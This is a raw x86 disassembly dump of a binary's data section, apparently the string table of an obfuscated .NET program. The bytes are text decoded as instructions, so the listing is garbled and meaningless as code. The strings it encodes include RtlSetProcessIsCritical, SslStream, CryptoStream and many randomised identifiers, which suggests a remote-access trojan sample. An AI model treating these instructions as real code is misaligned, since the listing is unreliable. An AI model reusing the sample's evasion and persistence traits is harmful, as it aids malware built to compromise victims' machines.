  4089f7:	76 47                	jbe    0x408a40
  4089f9:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  4089ff:	74 66                	je     0x408a67
  408a01:	56                   	push   %esi
  408a02:	52                   	push   %edx
  408a03:	79 45                	jns    0x408a4a
  408a05:	67 75 45             	addr16 jne 0x408a4d
  408a08:	74 69                	je     0x408a73
  408a0a:	00 56 66             	add    %dl,0x66(%esi)
  408a0d:	52                   	push   %edx
  408a0e:	4e                   	dec    %esi
  408a0f:	6d                   	insl   (%dx),%es:(%edi)
  408a10:	48                   	dec    %eax
  408a11:	51                   	push   %ecx
  408a12:	45                   	inc    %ebp
  408a13:	6f                   	outsl  %ds:(%esi),(%dx)
  408a14:	77 69                	ja     0x408a7f
  408a16:	00 45 4e             	add    %al,0x4e(%ebp)
  408a19:	57                   	push   %edi
  408a1a:	4c                   	dec    %esp
  408a1b:	75 4f                	jne    0x408a6c
  408a1d:	53                   	push   %ebx
  408a1e:	66 77 61             	data16 ja 0x408a82
  408a21:	79 79                	jns    0x408a9c
  408a23:	69 00 67 4b 44 74    	imul   $0x74444b67,(%eax),%eax
  408a29:	4b                   	dec    %ebx
  408a2a:	56                   	push   %esi
  408a2b:	41                   	inc    %ecx
  408a2c:	57                   	push   %edi
  408a2d:	4c                   	dec    %esp
  408a2e:	6a 00                	push   $0x0
  408a30:	46                   	inc    %esi
  408a31:	48                   	dec    %eax
  408a32:	64 45                	fs inc %ebp
  408a34:	73 57                	jae    0x408a8d
  408a36:	64 64 48             	fs fs dec %eax
  408a39:	65 4c                	gs dec %esp
  408a3b:	6a 00                	push   $0x0
  408a3d:	6d                   	insl   (%dx),%es:(%edi)
  408a3e:	58                   	pop    %eax
  408a3f:	74 74                	je     0x408ab5
  408a41:	6c                   	insb   (%dx),%es:(%edi)
  408a42:	61                   	popa
  408a43:	6f                   	outsl  %ds:(%esi),(%dx)
  408a44:	4c                   	dec    %esp
  408a45:	65 75 65             	gs jne 0x408aad
  408a48:	63 6a 00             	arpl   %ebp,0x0(%edx)
  408a4b:	63 52 50             	arpl   %edx,0x50(%edx)
  408a4e:	4e                   	dec    %esi
  408a4f:	6a 56                	push   $0x56
  408a51:	77 42                	ja     0x408a95
  408a53:	71 75                	jno    0x408aca
  408a55:	6f                   	outsl  %ds:(%esi),(%dx)
  408a56:	78 6a                	js     0x408ac2
  408a58:	00 50 70             	add    %dl,0x70(%eax)
  408a5b:	6c                   	insb   (%dx),%es:(%edi)
  408a5c:	4a                   	dec    %edx
  408a5d:	77 4e                	ja     0x408aad
  408a5f:	64 4b                	fs dec %ebx
  408a61:	47                   	inc    %edi
  408a62:	59                   	pop    %ecx
  408a63:	57                   	push   %edi
  408a64:	6b 00 41             	imul   $0x41,(%eax),%eax
  408a67:	73 79                	jae    0x408ae2
  408a69:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6a:	63 43 61             	arpl   %eax,0x61(%ebx)
  408a6d:	6c                   	insb   (%dx),%es:(%edi)
  408a6e:	6c                   	insb   (%dx),%es:(%edi)
  408a6f:	62 61 63             	bound  %esp,0x63(%ecx)
  408a72:	6b 00 52             	imul   $0x52,(%eax),%eax
  408a75:	65 6d                	gs insl (%dx),%es:(%edi)
  408a77:	6f                   	outsl  %ds:(%esi),(%dx)
  408a78:	74 65                	je     0x408adf
  408a7a:	43                   	inc    %ebx
  408a7b:	65 72 74             	gs jb  0x408af2
  408a7e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408a85:	56                   	push   %esi
  408a86:	61                   	popa
  408a87:	6c                   	insb   (%dx),%es:(%edi)
  408a88:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408a8f:	43 
  408a90:	61                   	popa
  408a91:	6c                   	insb   (%dx),%es:(%edi)
  408a92:	6c                   	insb   (%dx),%es:(%edi)
  408a93:	62 61 63             	bound  %esp,0x63(%ecx)
  408a96:	6b 00 54             	imul   $0x54,(%eax),%eax
  408a99:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408aa0:	6c                   	insb   (%dx),%es:(%edi)
  408aa1:	62 61 63             	bound  %esp,0x63(%ecx)
  408aa4:	6b 00 52             	imul   $0x52,(%eax),%eax
  408aa7:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408aae:	4b 65 
  408ab0:	79 50                	jns    0x408b02
  408ab2:	65 72 6d             	gs jb  0x408b22
  408ab5:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408abc:	68 65 63 6b 00       	push   $0x6b6365
  408ac1:	46                   	inc    %esi
  408ac2:	6c                   	insb   (%dx),%es:(%edi)
  408ac3:	75 73                	jne    0x408b38
  408ac5:	68 46 69 6e 61       	push   $0x616e6946
  408aca:	6c                   	insb   (%dx),%es:(%edi)
  408acb:	42                   	inc    %edx
  408acc:	6c                   	insb   (%dx),%es:(%edi)
  408acd:	6f                   	outsl  %ds:(%esi),(%dx)
  408ace:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408ad1:	62 4d 73             	bound  %ecx,0x73(%ebp)
  408ad4:	4d                   	dec    %ebp
  408ad5:	73 75                	jae    0x408b4c
  408ad7:	53                   	push   %ebx
  408ad8:	65 71 4b             	gs jno 0x408b26
  408adb:	6b 77 65 6b          	imul   $0x6b,0x65(%edi),%esi
  408adf:	00 61 7a             	add    %ah,0x7a(%ecx)
  408ae2:	46                   	inc    %esi
  408ae3:	4c                   	dec    %esp
  408ae4:	72 67                	jb     0x408b4d
  408ae6:	76 79                	jbe    0x408b61
  408ae8:	46                   	inc    %esi
  408ae9:	6c                   	insb   (%dx),%es:(%edi)
  408aea:	5a                   	pop    %edx
  408aeb:	59                   	pop    %ecx
  408aec:	47                   	inc    %edi
  408aed:	6c                   	insb   (%dx),%es:(%edi)
  408aee:	00 58 6a             	add    %bl,0x6a(%eax)
  408af1:	52                   	push   %edx
  408af2:	77 70                	ja     0x408b64
  408af4:	5a                   	pop    %edx
  408af5:	68 7a 52 73 76       	push   $0x7673527a
  408afa:	6a 4b                	push   $0x4b
  408afc:	6c                   	insb   (%dx),%es:(%edi)
  408afd:	00 52 69             	add    %dl,0x69(%edx)
  408b00:	66 76 4a             	data16 jbe 0x408b4d
  408b03:	6d                   	insl   (%dx),%es:(%edi)
  408b04:	48                   	dec    %eax
  408b05:	4b                   	dec    %ebx
  408b06:	54                   	push   %esp
  408b07:	64 66 77 4b          	fs data16 ja 0x408b56
  408b0b:	6c                   	insb   (%dx),%es:(%edi)
  408b0c:	00 56 4e             	add    %dl,0x4e(%esi)
  408b0f:	4e                   	dec    %esi
  408b10:	5a                   	pop    %edx
  408b11:	47                   	inc    %edi
  408b12:	4b                   	dec    %ebx
  408b13:	63 41 45             	arpl   %eax,0x45(%ecx)
  408b16:	6d                   	insl   (%dx),%es:(%edi)
  408b17:	57                   	push   %edi
  408b18:	6c                   	insb   (%dx),%es:(%edi)
  408b19:	00 73 58             	add    %dh,0x58(%ebx)
  408b1c:	54                   	push   %esp
  408b1d:	42                   	inc    %edx
  408b1e:	70 52                	jo     0x408b72
  408b20:	68 6f 4a 51 58       	push   $0x58514a6f
  408b25:	6f                   	outsl  %ds:(%esi),(%dx)
  408b26:	57                   	push   %edi
  408b27:	6c                   	insb   (%dx),%es:(%edi)
  408b28:	00 52 74             	add    %dl,0x74(%edx)
  408b2b:	6c                   	insb   (%dx),%es:(%edi)
  408b2c:	53                   	push   %ebx
  408b2d:	65 74 50             	gs je  0x408b80
  408b30:	72 6f                	jb     0x408ba1
  408b32:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b35:	73 49                	jae    0x408b80
  408b37:	73 43                	jae    0x408b7c
  408b39:	72 69                	jb     0x408ba4
  408b3b:	74 69                	je     0x408ba6
  408b3d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408b40:	00 4e 65             	add    %cl,0x65(%esi)
  408b43:	74 77                	je     0x408bbc
  408b45:	6f                   	outsl  %ds:(%esi),(%dx)
  408b46:	72 6b                	jb     0x408bb3
  408b48:	43                   	inc    %ebx
  408b49:	72 65                	jb     0x408bb0
  408b4b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408b4e:	74 69                	je     0x408bb9
  408b50:	61                   	popa
  408b51:	6c                   	insb   (%dx),%es:(%edi)
  408b52:	00 53 79             	add    %dl,0x79(%ebx)
  408b55:	73 74                	jae    0x408bcb
  408b57:	65 6d                	gs insl (%dx),%es:(%edi)
  408b59:	2e 53                	cs push %ebx
  408b5b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408b5f:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408b66:	6e 
  408b67:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b6a:	61                   	popa
  408b6b:	6c                   	insb   (%dx),%es:(%edi)
  408b6c:	00 57 69             	add    %dl,0x69(%edi)
  408b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408b70:	64 6f                	outsl  %fs:(%esi),(%dx)
  408b72:	77 73                	ja     0x408be7
  408b74:	50                   	push   %eax
  408b75:	72 69                	jb     0x408be0
  408b77:	6e                   	outsb  %ds:(%esi),(%dx)
  408b78:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b7b:	61                   	popa
  408b7c:	6c                   	insb   (%dx),%es:(%edi)
  408b7d:	00 67 65             	add    %ah,0x65(%edi)
  408b80:	74 5f                	je     0x408be1
  408b82:	49                   	dec    %ecx
  408b83:	6e                   	outsb  %ds:(%esi),(%dx)
  408b84:	74 65                	je     0x408beb
  408b86:	72 76                	jb     0x408bfe
  408b88:	61                   	popa
  408b89:	6c                   	insb   (%dx),%es:(%edi)
  408b8a:	00 73 65             	add    %dh,0x65(%ebx)
  408b8d:	74 5f                	je     0x408bee
  408b8f:	49                   	dec    %ecx
  408b90:	6e                   	outsb  %ds:(%esi),(%dx)
  408b91:	74 65                	je     0x408bf8
  408b93:	72 76                	jb     0x408c0b
  408b95:	61                   	popa
  408b96:	6c                   	insb   (%dx),%es:(%edi)
  408b97:	00 6b 65             	add    %ch,0x65(%ebx)
  408b9a:	72 6e                	jb     0x408c0a
  408b9c:	65 6c                	gs insb (%dx),%es:(%edi)
  408b9e:	33 32                	xor    (%edx),%esi
  408ba0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408ba3:	6c                   	insb   (%dx),%es:(%edi)
  408ba4:	00 6e 74             	add    %ch,0x74(%esi)
  408ba7:	64 6c                	fs insb (%dx),%es:(%edi)
  408ba9:	6c                   	insb   (%dx),%es:(%edi)
  408baa:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408bad:	6c                   	insb   (%dx),%es:(%edi)
  408bae:	00 4b 69             	add    %cl,0x69(%ebx)
  408bb1:	6c                   	insb   (%dx),%es:(%edi)
  408bb2:	6c                   	insb   (%dx),%es:(%edi)
  408bb3:	00 50 6f             	add    %dl,0x6f(%eax)
  408bb6:	6c                   	insb   (%dx),%es:(%edi)
  408bb7:	6c                   	insb   (%dx),%es:(%edi)
  408bb8:	00 55 6a             	add    %dl,0x6a(%ebp)
  408bbb:	44                   	inc    %esp
  408bbc:	72 6d                	jb     0x408c2b
  408bbe:	56                   	push   %esi
  408bbf:	7a 43                	jp     0x408c04
  408bc1:	6b 57 4a 77          	imul   $0x77,0x4a(%edi),%edx
  408bc5:	6c                   	insb   (%dx),%es:(%edi)
  408bc6:	00 42 61             	add    %al,0x61(%edx)
  408bc9:	6b 42 49 65          	imul   $0x65,0x49(%edx),%eax
  408bcd:	51                   	push   %ecx
  408bce:	53                   	push   %ebx
  408bcf:	47                   	inc    %edi
  408bd0:	6d                   	insl   (%dx),%es:(%edi)
  408bd1:	00 61 73             	add    %ah,0x73(%ecx)
  408bd4:	77 56                	ja     0x408c2c
  408bd6:	4b                   	dec    %ebx
  408bd7:	76 43                	jbe    0x408c1c
  408bd9:	56                   	push   %esi
  408bda:	77 67                	ja     0x408c43
  408bdc:	54                   	push   %esp
  408bdd:	6d                   	insl   (%dx),%es:(%edi)
  408bde:	00 50 54             	add    %dl,0x54(%eax)
  408be1:	57                   	push   %edi
  408be2:	72 4d                	jb     0x408c31
  408be4:	70 75                	jo     0x408c5b
  408be6:	74 54                	je     0x408c3c
  408be8:	6d                   	insl   (%dx),%es:(%edi)
  408be9:	00 65 72             	add    %ah,0x72(%ebp)
  408bec:	44                   	inc    %esp
  408bed:	73 41                	jae    0x408c30
  408bef:	53                   	push   %ebx
  408bf0:	45                   	inc    %ebp
  408bf1:	4b                   	dec    %ebx
  408bf2:	55                   	push   %ebp
  408bf3:	6d                   	insl   (%dx),%es:(%edi)
  408bf4:	00 75 72             	add    %dh,0x72(%ebp)
  408bf7:	42                   	inc    %edx
  408bf8:	68 6a 49 69 51       	push   $0x5169496a
  408bfd:	74 77                	je     0x408c76
  408bff:	55                   	push   %ebp
  408c00:	6d                   	insl   (%dx),%es:(%edi)
  408c01:	00 46 69             	add    %al,0x69(%esi)
  408c04:	6c                   	insb   (%dx),%es:(%edi)
  408c05:	65 53                	gs push %ebx
  408c07:	74 72                	je     0x408c7b
  408c09:	65 61                	gs popa
  408c0b:	6d                   	insl   (%dx),%es:(%edi)
  408c0c:	00 4e 65             	add    %cl,0x65(%esi)
  408c0f:	74 77                	je     0x408c88
  408c11:	6f                   	outsl  %ds:(%esi),(%dx)
  408c12:	72 6b                	jb     0x408c7f
  408c14:	53                   	push   %ebx
  408c15:	74 72                	je     0x408c89
  408c17:	65 61                	gs popa
  408c19:	6d                   	insl   (%dx),%es:(%edi)
  408c1a:	00 53 73             	add    %dl,0x73(%ebx)
  408c1d:	6c                   	insb   (%dx),%es:(%edi)
  408c1e:	53                   	push   %ebx
  408c1f:	74 72                	je     0x408c93
  408c21:	65 61                	gs popa
  408c23:	6d                   	insl   (%dx),%es:(%edi)
  408c24:	00 43 72             	add    %al,0x72(%ebx)
  408c27:	79 70                	jns    0x408c99
  408c29:	74 6f                	je     0x408c9a
  408c2b:	53                   	push   %ebx
  408c2c:	74 72                	je     0x408ca0
  408c2e:	65 61                	gs popa
  408c30:	6d                   	insl   (%dx),%es:(%edi)
  408c31:	00 47 5a             	add    %al,0x5a(%edi)
  408c34:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408c3b:	6d                   	insl   (%dx),%es:(%edi)
  408c3c:	00 4d 65             	add    %cl,0x65(%ebp)
  408c3f:	6d                   	insl   (%dx),%es:(%edi)
  408c40:	6f                   	outsl  %ds:(%esi),(%dx)
  408c41:	72 79                	jb     0x408cbc
  408c43:	53                   	push   %ebx
  408c44:	74 72                	je     0x408cb8
  408c46:	65 61                	gs popa
  408c48:	6d                   	insl   (%dx),%es:(%edi)
  408c49:	00 79 4e             	add    %bh,0x4e(%ecx)
  408c4c:	63 76 41             	arpl   %esi,0x41(%esi)
  408c4f:	44                   	inc    %esp
  408c50:	6d                   	insl   (%dx),%es:(%edi)
  408c51:	63 73 61             	arpl   %esi,0x61(%ebx)
  408c54:	6d                   	insl   (%dx),%es:(%edi)
  408c55:	00 67 65             	add    %ah,0x65(%edi)
  408c58:	74 5f                	je     0x408cb9
  408c5a:	49                   	dec    %ecx
  408c5b:	74 65                	je     0x408cc2
  408c5d:	6d                   	insl   (%dx),%es:(%edi)
  408c5e:	00 67 65             	add    %ah,0x65(%edi)
  408c61:	74 5f                	je     0x408cc2
  408c63:	49                   	dec    %ecx
  408c64:	73 36                	jae    0x408c9c
  408c66:	34 42                	xor    $0x42,%al
  408c68:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408c6f:	74 
  408c70:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408c77:	65 6d                	gs insl (%dx),%es:(%edi)
  408c79:	00 53 79             	add    %dl,0x79(%ebx)
  408c7c:	6d                   	insl   (%dx),%es:(%edi)
  408c7d:	6d                   	insl   (%dx),%es:(%edi)
  408c7e:	65 74 72             	gs je  0x408cf3
  408c81:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408c88:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408c8f:	79 
  408c90:	6d                   	insl   (%dx),%es:(%edi)
  408c91:	6d                   	insl   (%dx),%es:(%edi)
  408c92:	65 74 72             	gs je  0x408d07
  408c95:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408c9c:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408ca3:	73 
  408ca4:	68 41 6c 67 6f       	push   $0x6f676c41
  408ca9:	72 69                	jb     0x408d14
  408cab:	74 68                	je     0x408d15
  408cad:	6d                   	insl   (%dx),%es:(%edi)
  408cae:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408cb2:	6d                   	insl   (%dx),%es:(%edi)
  408cb3:	00 47 53             	add    %al,0x53(%edi)
  408cb6:	54                   	push   %esp
  408cb7:	48                   	dec    %eax
  408cb8:	71 69                	jno    0x408d23
  408cba:	66 58                	pop    %ax
  408cbc:	51                   	push   %ecx
  408cbd:	45                   	inc    %ebp
  408cbe:	4b                   	dec    %ebx
  408cbf:	6b 6d 00 52          	imul   $0x52,0x0(%ebp),%ebp
  408cc3:	61                   	popa
  408cc4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc5:	64 6f                	outsl  %fs:(%esi),(%dx)
  408cc7:	6d                   	insl   (%dx),%es:(%edi)
  408cc8:	00 49 43             	add    %cl,0x43(%ecx)
  408ccb:	72 79                	jb     0x408d46
  408ccd:	70 74                	jo     0x408d43
  408ccf:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd0:	54                   	push   %esp
  408cd1:	72 61                	jb     0x408d34
  408cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd4:	73 66                	jae    0x408d3c
  408cd6:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd7:	72 6d                	jb     0x408d46
  408cd9:	00 45 6e             	add    %al,0x6e(%ebp)
  408cdc:	75 6d                	jne    0x408d4b
  408cde:	00 65 46             	add    %ah,0x46(%ebp)
  408ce1:	57                   	push   %edi
  408ce2:	66 41                	inc    %cx
  408ce4:	6b 6f 41 6f          	imul   $0x6f,0x41(%edi),%ebp
  408ce8:	4c                   	dec    %esp
  408ce9:	77 6f                	ja     0x408d5a
  408ceb:	4a                   	dec    %edx
  408cec:	76 6d                	jbe    0x408d5b
  408cee:	00 6d 54             	add    %ch,0x54(%ebp)
  408cf1:	50                   	push   %eax
  408cf2:	50                   	push   %eax
  408cf3:	79 47                	jns    0x408d3c
  408cf5:	43                   	inc    %ebx
  408cf6:	6d                   	insl   (%dx),%es:(%edi)
  408cf7:	54                   	push   %esp
  408cf8:	58                   	pop    %eax
  408cf9:	51                   	push   %ecx
  408cfa:	41                   	inc    %ecx
  408cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfc:	00 6f 43             	add    %ch,0x43(%edi)
  408cff:	6a 47                	push   $0x47
  408d01:	65 61                	gs popa
  408d03:	49                   	dec    %ecx
  408d04:	44                   	inc    %esp
  408d05:	65 4c                	gs dec %esp
  408d07:	6e                   	outsb  %ds:(%esi),(%dx)
  408d08:	00 43 6f             	add    %al,0x6f(%ebx)
  408d0b:	57                   	push   %edi
  408d0c:	65 67 70 6e          	gs addr16 jo 0x408d7e
  408d10:	4f                   	dec    %edi
  408d11:	42                   	inc    %edx
  408d12:	69 4e 4e 6e 00 6d 4f 	imul   $0x4f6d006e,0x4e(%esi),%ecx
  408d19:	46                   	inc    %esi
  408d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d1b:	4f                   	dec    %edi
  408d1c:	68 5a 43 6e 56       	push   $0x566e435a
  408d21:	4f                   	dec    %edi
  408d22:	6e                   	outsb  %ds:(%esi),(%dx)
  408d23:	00 55 47             	add    %dl,0x47(%ebp)
  408d26:	6e                   	outsb  %ds:(%esi),(%dx)
  408d27:	71 47                	jno    0x408d70
  408d29:	6d                   	insl   (%dx),%es:(%edi)
  408d2a:	52                   	push   %edx
  408d2b:	6b 6c 67 50 6e       	imul   $0x6e,0x50(%edi,%eiz,2),%ebp
  408d30:	00 49 65             	add    %cl,0x65(%ecx)
  408d33:	45                   	inc    %ebp
  408d34:	4c                   	dec    %esp
  408d35:	78 42                	js     0x408d79
  408d37:	48                   	dec    %eax
  408d38:	59                   	pop    %ecx
  408d39:	42                   	inc    %edx
  408d3a:	73 75                	jae    0x408db1
  408d3c:	58                   	pop    %eax
  408d3d:	74 50                	je     0x408d8f
  408d3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d40:	00 76 7a             	add    %dh,0x7a(%esi)
  408d43:	70 54                	jo     0x408d99
  408d45:	50                   	push   %eax
  408d46:	47                   	inc    %edi
  408d47:	72 54                	jb     0x408d9d
  408d49:	73 51                	jae    0x408d9c
  408d4b:	52                   	push   %edx
  408d4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4d:	00 69 47             	add    %ch,0x47(%ecx)
  408d50:	50                   	push   %eax
  408d51:	65 67 63 5a 6f       	arpl   %ebx,%gs:0x6f(%bp,%si)
  408d56:	49                   	dec    %ecx
  408d57:	68 70 56 6e 00       	push   $0x6e5670
  408d5c:	64 52                	fs push %edx
  408d5e:	65 52                	gs push %edx
  408d60:	79 4d                	jns    0x408daf
  408d62:	51                   	push   %ecx
  408d63:	4b                   	dec    %ebx
  408d64:	43                   	inc    %ebx
  408d65:	43                   	inc    %ebx
  408d66:	55                   	push   %ebp
  408d67:	59                   	pop    %ecx
  408d68:	6e                   	outsb  %ds:(%esi),(%dx)
  408d69:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408d6d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6e:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6f:	6c                   	insb   (%dx),%es:(%edi)
  408d70:	65 61                	gs popa
  408d72:	6e                   	outsb  %ds:(%esi),(%dx)
  408d73:	00 4d 61             	add    %cl,0x61(%ebp)
  408d76:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  408d7d:	43                   	inc    %ebx
  408d7e:	68 61 69 6e 00       	push   $0x6e6961
  408d83:	41                   	inc    %ecx
  408d84:	70 70                	jo     0x408df6
  408d86:	44                   	inc    %esp
  408d87:	6f                   	outsl  %ds:(%esi),(%dx)
  408d88:	6d                   	insl   (%dx),%es:(%edi)
  408d89:	61                   	popa
  408d8a:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408d91:	43                   	inc    %ebx
  408d92:	75 72                	jne    0x408e06
  408d94:	72 65                	jb     0x408dfb
  408d96:	6e                   	outsb  %ds:(%esi),(%dx)
  408d97:	74 44                	je     0x408ddd
  408d99:	6f                   	outsl  %ds:(%esi),(%dx)
  408d9a:	6d                   	insl   (%dx),%es:(%edi)
  408d9b:	61                   	popa
  408d9c:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408da3:	00 55 71             	add    %dl,0x71(%ebp)
  408da6:	56                   	push   %esi
  408da7:	49                   	dec    %ecx
  408da8:	6c                   	insb   (%dx),%es:(%edi)
  408da9:	72 79                	jb     0x408e24
  408dab:	47                   	inc    %edi
  408dac:	71 70                	jno    0x408e1e
  408dae:	7a 6d                	jp     0x408e1d
  408db0:	6e                   	outsb  %ds:(%esi),(%dx)
  408db1:	00 78 50             	add    %bh,0x50(%eax)
  408db4:	76 6a                	jbe    0x408e20
  408db6:	67 71 55             	addr16 jno 0x408e0e
  408db9:	42                   	inc    %edx
  408dba:	50                   	push   %eax
  408dbb:	54                   	push   %esp
  408dbc:	46                   	inc    %esi
  408dbd:	45                   	inc    %ebp
  408dbe:	42                   	inc    %edx
  408dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc0:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc1:	00 47 65             	add    %al,0x65(%edi)
  408dc4:	74 46                	je     0x408e0c
  408dc6:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408dcd:	57 
  408dce:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408dd5:	78 
  408dd6:	74 65                	je     0x408e3d
  408dd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408dd9:	73 69                	jae    0x408e44
  408ddb:	6f                   	outsl  %ds:(%esi),(%dx)
  408ddc:	6e                   	outsb  %ds:(%esi),(%dx)
  408ddd:	00 67 65             	add    %ah,0x65(%edi)
  408de0:	74 5f                	je     0x408e41
  408de2:	4f                   	dec    %edi
  408de3:	53                   	push   %ebx
  408de4:	56                   	push   %esi
  408de5:	65 72 73             	gs jb  0x408e5b
  408de8:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408def:	74 65                	je     0x408e56
  408df1:	6d                   	insl   (%dx),%es:(%edi)
  408df2:	2e 49                	cs dec %ecx
  408df4:	4f                   	dec    %edi
  408df5:	2e 43                	cs inc %ebx
  408df7:	6f                   	outsl  %ds:(%esi),(%dx)
  408df8:	6d                   	insl   (%dx),%es:(%edi)
  408df9:	70 72                	jo     0x408e6d
  408dfb:	65 73 73             	gs jae 0x408e71
  408dfe:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408e05:	6c                   	insb   (%dx),%es:(%edi)
  408e06:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408e0d:	00 53 79             	add    %dl,0x79(%ebx)
  408e10:	73 74                	jae    0x408e86
  408e12:	65 6d                	gs insl (%dx),%es:(%edi)
  408e14:	2e 53                	cs push %ebx
  408e16:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e1a:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408e21:	68 
  408e22:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e24:	74 69                	je     0x408e8f
  408e26:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e29:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408e30:	74 65                	je     0x408e97
  408e32:	6d                   	insl   (%dx),%es:(%edi)
  408e33:	2e 52                	cs push %edx
  408e35:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408e38:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408e3e:	00 58 35             	add    %bl,0x35(%eax)
  408e41:	30 39                	xor    %bh,(%ecx)
  408e43:	43                   	inc    %ebx
  408e44:	65 72 74             	gs jb  0x408ebb
  408e47:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e4e:	43                   	inc    %ebx
  408e4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e50:	6c                   	insb   (%dx),%es:(%edi)
  408e51:	6c                   	insb   (%dx),%es:(%edi)
  408e52:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e57:	6e                   	outsb  %ds:(%esi),(%dx)
  408e58:	00 4d 61             	add    %cl,0x61(%ebp)
  408e5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e5c:	61                   	popa
  408e5d:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e60:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e62:	74 4f                	je     0x408eb3
  408e64:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e67:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408e6b:	6c                   	insb   (%dx),%es:(%edi)
  408e6c:	6c                   	insb   (%dx),%es:(%edi)
  408e6d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e72:	6e                   	outsb  %ds:(%esi),(%dx)
  408e73:	00 73 65             	add    %dh,0x65(%ebx)
  408e76:	74 5f                	je     0x408ed7
  408e78:	50                   	push   %eax
  408e79:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7a:	73 69                	jae    0x408ee5
  408e7c:	74 69                	je     0x408ee7
  408e7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e80:	00 43 72             	add    %al,0x72(%ebx)
  408e83:	79 70                	jns    0x408ef5
  408e85:	74 6f                	je     0x408ef6
  408e87:	67 72 61             	addr16 jb 0x408eeb
  408e8a:	70 68                	jo     0x408ef4
  408e8c:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408e93:	74 69                	je     0x408efe
  408e95:	6f                   	outsl  %ds:(%esi),(%dx)
  408e96:	6e                   	outsb  %ds:(%esi),(%dx)
  408e97:	00 41 72             	add    %al,0x72(%ecx)
  408e9a:	67 75 6d             	addr16 jne 0x408f0a
  408e9d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e9f:	74 4e                	je     0x408eef
  408ea1:	75 6c                	jne    0x408f0f
  408ea3:	6c                   	insb   (%dx),%es:(%edi)
  408ea4:	45                   	inc    %ebp
  408ea5:	78 63                	js     0x408f0a
  408ea7:	65 70 74             	gs jo  0x408f1e
  408eaa:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408eb1:	75 6d                	jne    0x408f20
  408eb3:	65 6e                	outsb  %gs:(%esi),(%dx)
  408eb5:	74 45                	je     0x408efc
  408eb7:	78 63                	js     0x408f1c
